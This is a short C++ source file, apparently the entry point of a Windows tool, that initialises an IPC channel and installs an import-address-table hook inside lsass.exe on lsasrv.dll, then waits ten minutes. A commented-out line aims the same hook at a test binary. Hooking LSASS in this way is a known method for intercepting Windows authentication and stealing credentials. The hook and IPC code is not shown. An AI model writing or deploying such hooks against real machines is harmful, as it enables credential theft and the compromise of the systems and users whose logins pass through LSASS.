#include <cassert>
#include <cstdlib>
#include <print>
#include <thread>

#include "driver.h"
#include "finder.h"
#include "hook.h"
#include "ipc.h"


int main( ) {

	ipc::init( );

	//hook::hook_iat( "lsa_test2.exe", "lsa_test2.exe" );
	hook::hook_iat( "lsass.exe", "lsasrv.dll" );

	Sleep( 10 * 60000 );

	return EXIT_SUCCESS;
}